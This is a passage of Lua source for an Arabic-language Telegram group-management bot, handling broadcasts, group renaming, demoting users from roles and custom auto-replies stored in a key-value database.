Msgs2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Msgs2)
end,nil)  
send(msg.chat_id_, msg.id_,'◉ تم مسح جميع الرسائل المعدله')
end
if text == "تغير اسم البوت" or text == "تغيير اسم البوت" then 
if DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ◉ ارسل لي الاسم الان ")  
end
return false
end



if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
send(msg.chat_id_, msg.id_,' ◉ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك \n ◉ للخروج ارسل الغاء") 
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
send(msg.chat_id_, msg.id_,' ◉ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك \n ◉ للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
send(msg.chat_id_, msg.id_,' ◉ الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
send(msg.chat_id_, msg.id_,' ◉  الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل لي التوجيه الان") 
return false
end 
if text and text:match('^ضع اسم (.*)') and Manager(msg) or text and text:match('^وضع اسم (.*)') and Manager(msg) then 
local Name = text:match('^ضع اسم (.*)') or text and text:match('^وضع اسم (.*)') 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_," ◉ البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ◉ ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' ◉ تم تغيير اسم الجروب الى {['..Name..']}')  
end
end,nil) 
end

---------- ما مبيك خير تسوي مثله جاي تبوكة مطور زربة انته 
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ يرجى الاشتراك بالقناه اولا \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if (result.id_) then
if tonumber(result.id_) == true then
send(msg.chat_id_, msg.id_,"◉ لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id.."Sudo:User",result.id_) then
dev = "المطور ،" else dev = "" end
if database:sismember(bot_id.."CoSu",result.id_) then
cu = "الفا ،" else cu = "" end
if database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if database:sismember(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Can_or_NotCan(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n◉ تم تنزيل الشخص من الرتب التاليه \n◉  { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n◉  عذرا العضو لايملك رتبه \n")
end
if tonumber(msg.sender_user_id_) == true then
database:srem(bot_id.."Sudo:User", result.id_)
database:srem(bot_id.."CoSu", result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id.."Sudo:User",msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."CoSu",msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
database:srem(bot_id.."Basic:Constructor"..msg.chat_id_,result.id_)
elseif database:sismember(bot_id.."Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, start_function, nil)
end

if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if tonumber(SUDO) == tonumber(result.sender_user_id_) then
send(msg.chat_id_, msg.id_," ◉ لا تستطيع تنزيل المطور الاساسي")
return false 
end
if database:sismember(bot_id..'Sudo:User',result.sender_user_id_) then
dev = 'المطور ،' else dev = '' end
if database:sismember(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_) then
cu = 'الفا ،' else cu = '' end
if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n ◉ تم تنزيل الشخص من الرتب التاليه \n ◉ { "..dev..''..crr..''..cr..''..own..''..mod..''..mn..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n ◉  عذرا العضو لايملك رتبه \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:SoFi:2',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("مسح الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id..'List:Rd:Sudo')
end
send(msg.chat_id_, msg.id_," ◉ تم مسح الردود العامه")
end

if text == ("الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ◉ قائمة الردود العامه \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = 'اغنيه'
end
text = text..""..k.." >> ("..v..") ← {"..db.."}\n"
end
if #list == 0 then
text = " ◉ لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_)
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' ◉ تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' ◉ ارسل الرد الذي تريد اضافته')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_, 'true1')
database:set(bot_id..'Text:Sudo:Bot'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:sadd(bot_id..'List:Rd:Sudo', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' ◉ تم ازالة الرد العام')
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..v..text)
end
database:del(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Rd:Sudo', text)
return false
end
end
if text == 'اضف رد عام' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' ◉ ارسل الكلمه تريد اضافتها')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'مسح رد عام' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' ◉ ارسل الكلمه تريد مسحها')
database:set(bot_id..'Set:On'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text and not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local text1 = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ◉ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:DRAGON:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"◉ تم مسح الرد من ردود المتعدده")
database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:DRAGON:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:DRAGON:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"◉تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_,text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
if text == ("مسح الردود") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id..'List:Manager'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_," ◉ تم مسح الردود")
end

if text == ("الردود") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " ◉ قائمه الردود \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = 'اغنيه'
end
text = text..""..k..">> ("..v..") ← {"..db.."}\n"
end
if #list == 0 then
text = " ◉ لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_..'')
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' ◉ تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
